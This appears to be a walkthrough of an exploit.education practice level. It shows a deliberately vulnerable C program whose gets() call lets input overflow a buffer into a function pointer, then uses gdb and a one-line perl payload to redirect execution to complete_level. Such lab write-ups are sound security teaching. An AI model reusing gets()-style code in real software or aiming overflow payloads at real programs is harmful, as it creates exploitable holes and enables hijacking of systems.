Now it's time for some `gdb`-ing. In this exercise, we want to make the function
pointer `fp` in the `locals` struct, point to `complete_level`.

Hence we want to figure out how to print addresses of functions in `gdb`. Fun
stuff, let's go!

# Source code

```C
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

#Walkthrough

As always, we start `gdb` with `gdb /path/to/program`. Inside of `gdb`, we run

```
(gdb) b main
(gdb) r
(gdb) info address complete_level
```

This tells us that the function `complete_level` begins at `0x40069d`, so that's
where we want to jump. Thus, we want to overflow `buffer` so that `fp` becomes
`0x40069d`. Since this program uses `gets`, we should be able to get away with
using a pipe. So we try

```
$ perl -e 'print "A"x64,"\x9d\x06\x40\x00"' | ./program
```

and this works immediately!
